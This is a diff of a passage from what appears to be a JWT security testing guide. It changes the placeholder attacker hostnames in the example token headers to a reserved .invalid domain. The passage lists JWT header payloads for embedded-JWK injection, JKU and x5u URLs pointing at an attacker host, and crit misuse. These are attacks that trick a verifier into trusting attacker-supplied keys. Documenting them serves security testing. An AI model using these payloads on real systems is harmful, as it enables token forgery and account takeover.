@@ -208,12 +208,12 @@ Check Wayback Machine for historical URLs with tokens; monitor Referer headers t
 5. **JWK/JKU Injection:**
    ```
    {"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","e":"AQAB","kid":"attacker-key","n":"..."}}
-   {"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
+   {"alg":"RS256","typ":"JWT","jku":"https://attacker.invalid/jwks.json"}
    ```
 
 6. **x5u / crit Handling:**
    ```
-   {"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}
+   {"alg":"RS256","typ":"JWT","x5u":"https://attacker.invalid/cert.pem"}
    {"alg":"RS256","typ":"JWT","crit":["exp"],"exp":null}
    ```
 
